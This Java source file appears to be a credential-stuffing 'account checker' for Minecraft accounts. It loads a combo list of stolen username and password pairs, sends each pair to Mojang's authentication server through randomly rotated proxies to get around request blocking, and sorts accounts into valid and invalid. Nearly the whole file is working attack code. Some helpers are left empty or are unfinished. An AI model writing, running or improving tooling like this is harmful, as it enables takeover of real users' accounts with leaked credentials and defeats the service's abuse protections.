package utils;

import com.fasterxml.jackson.databind.ObjectMapper;

import javax.sound.sampled.Line;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.*;
import java.util.List;

public class Utils extends Component {
    public String comboList() {
        String chosenFile = null;
        JFileChooser chooser = new JFileChooser();
        chooser.setCurrentDirectory(new File((System.getProperty("user.home")) + "/Desktop"));
        int result = chooser.showOpenDialog(this);
        if (result == JFileChooser.APPROVE_OPTION) {
            File selected = chooser.getSelectedFile();
            chosenFile = selected.getAbsolutePath();
            System.out.println("Selected combo list: " + chosenFile);
        }
        return chosenFile;
    }

    ObjectMapper objectMapper = new ObjectMapper();

    // ACCOUNT CHECKER
    public AccType checkAccount(final String username, final String password) {
        AccType type = AccType.INVALID;

        String url = "https://authserver.mojang.com/authenticate";
        HashMap<String, String> credentials = new HashMap<>() {{
            put("username", username);
            put("password", password);
        }};

        String proxyCombo = getRandomProxyFromList();
        try {
            String requestBody = objectMapper.writeValueAsString(credentials);
            List<String> proxySplitter = Arrays.asList(proxyCombo.split(":"));
            final var client = HttpClient.newBuilder()
                    .proxy(ProxySelector.of(new InetSocketAddress(proxySplitter.get(0), Integer.parseInt(proxySplitter.get(1)))))
                    .build();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .POST(HttpRequest.BodyPublishers.ofString(requestBody))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            String responseString = response.body();
            if (responseString.contains("Request blocked.")) {
                type = AccType.REQUEST_ERROR;
            } else if (!responseString.contains("Invalid")) {
                type = AccType.VALID;
            }

        } catch (IOException | InterruptedException e) {
            System.out.println("COULD NOT CONNECT TO PROXY");
            removeProxyFromList(proxyCombo);
            return null;
        }

        return type;
    }

    URL resource = getClass().getClassLoader().getResource("proxies.txt");
    Random random = new Random();
    File file = null;
    Scanner scanner = null;
    int lines = -1;
    public String getRandomProxyFromList() {
        String proxy = "localhost:8080";
        try {
            if (file == null) file = new File(resource.toURI());
            if (scanner == null) scanner = new Scanner(file);
        } catch (URISyntaxException | FileNotFoundException e) {
            e.printStackTrace();
        }
        if (file.exists()) {
            if (lines == -1) {
                lines = 0;
                try {
                    BufferedReader reader = new BufferedReader(new FileReader(file.getPath()));
                    while (reader.readLine() != null) lines++;
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            int randomNumber = random.nextInt(lines );
            for (int i = 0; i < randomNumber; i++) {
                proxy = scanner.nextLine();
            }
        }
        return proxy;
    }

    public void removeProxyFromList(String proxy) {

    }

//    public String testProxy(String ip, String port) {
//
//    }
}
